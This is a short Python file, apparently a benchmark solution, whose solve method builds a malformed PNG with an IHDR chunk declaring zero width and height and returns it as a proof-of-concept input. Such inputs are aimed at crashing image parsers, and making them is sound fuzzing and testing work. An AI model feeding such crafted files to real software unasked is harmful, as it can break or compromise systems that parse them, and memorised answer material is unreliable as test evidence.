import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PNG signature
        png_sig = b'\x89PNG\r\n\x1a\n'
        # IHDR chunk data: width=0, height=0, bit depth=8, color type=2 (truecolor), compression=0, filter=0, interlace=0
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'
        ihdr_type = b'IHDR'
        ihdr_crc_input = ihdr_type + ihdr_data
        ihdr_crc = zlib.crc32(ihdr_crc_input) & 0xffffffff
        ihdr_length = len(ihdr_data)
        ihdr_chunk = ihdr_length.to_bytes(4, 'big') + ihdr_type + ihdr_data + ihdr_crc.to_bytes(4, 'big')
        # IEND chunk
        iend_type = b'IEND'
        iend_data = b''
        iend_crc_input = iend_type + iend_data
        iend_crc = zlib.crc32(iend_crc_input) & 0xffffffff
        iend_length = len(iend_data)
        iend_chunk = iend_length.to_bytes(4, 'big') + iend_type + iend_data + iend_crc.to_bytes(4, 'big')
        # Combine
        poc = png_sig + ihdr_chunk + iend_chunk
        return poc
